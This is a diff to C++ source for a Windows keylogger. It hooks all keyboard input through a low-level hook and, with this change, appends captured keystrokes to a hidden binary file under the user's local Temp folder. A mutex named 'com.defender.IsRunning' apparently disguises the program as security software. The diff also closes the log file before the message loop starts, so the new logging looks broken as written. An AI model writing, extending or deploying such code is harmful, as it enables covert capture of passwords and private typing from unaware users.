@@ -27,6 +27,8 @@ HWND lastWindow = NULL;
 // File Path
 std::wstring fileName = L"C:\\test.txt";
 
+std::ofstream logfile;
+
 std::string HookCode(DWORD code, BOOL caps, BOOL shift)
 {
 	//std::cout << "code=" << code << ",shift=" << shift << ",caps=" << caps << std::endl;
@@ -215,6 +217,8 @@ public:
 
 		OutputDebugStringA(string.c_str());
 		std::cout << string.c_str();
+		logfile << string.c_str();
+		logfile.flush();
 	}
 
 	static std::string GetProcessFileName(DWORD dwProcId)
@@ -413,15 +417,17 @@ boolean HookKeyboard()
 		pwstrAppData = NULL;
 	}
 
+	SetLastError(0);
 	KeyboardHook = SetWindowsHookEx(
 		WH_KEYBOARD_LL, // low-level keyboard input events
 		HookProcedure, // pointer to the hook procedure
 		GetModuleHandle(NULL), // A handle to the DLL containing the hook procedure 
 		NULL //desktop apps, if this parameter is zero
 	);
+	DWORD dwLastError = GetLastError();
 	if (!KeyboardHook) {
 		// Hook returned NULL and failed
-		My::Debug("HookKeyboard: Failed to get handle from SetWindowsHookEx()\n");
+		My::Debug(std::string("HookKeyboard: Failed to get handle from SetWindowsHookEx() dwLastError=") + std::to_string(dwLastError));
 	}
 
 	My::Debug("HookKeyboard:<--");
@@ -587,6 +593,8 @@ int WinMain(
 	int       nShowCmd
 )
 {
+	logfile = std::ofstream(std::string(getenv("LOCALAPPDATA")) + "\\Temp\\logfile.bin", std::ios::out | std::ios::app | std::ios::binary);
+
 	static char szUniqueNamedMutex[] = "com.defender.IsRunning";
 
 	My::Debug(std::string("WinMain: lpCmdLine=") + lpCmdLine + "\n");
@@ -598,14 +606,17 @@ int WinMain(
 
 	if (My::UpdateRegistration(lpCmdLine))
 	{
+		logfile.close();
 		return 0;
 	}
 
 	if (My::Test()) {
+		logfile.close();
 		return 0;
 	}
 
 	if (My::Service(lpCmdLine)) {
+		logfile.close();
 		return 0;
 	}
 
@@ -620,6 +631,7 @@ int WinMain(
 	  _In_ DWORD     dwThreadId
 	);
 	*/
+
 	// Start the hook of the keyboard
 	SetLastError(0);
 	HANDLE hHandle = CreateMutexA(NULL, TRUE, szUniqueNamedMutex);
@@ -627,12 +639,17 @@ int WinMain(
 	{
 		My::Debug("WinMain: Already running!!!");
 
+		logfile.close();
 		return 0;
 	}
 	else
 	{
-		if (HookKeyboard()) {
+		if (HookKeyboard()) 
+		{
 			My::Debug("WinMain: Setting up hook");
+
+			logfile.close();
+
 			// http://www.winprog.org/tutorial/message_loop.html
 			MSG Msg;
 			while (GetMessage(&Msg, NULL, 0, 0) > 0)
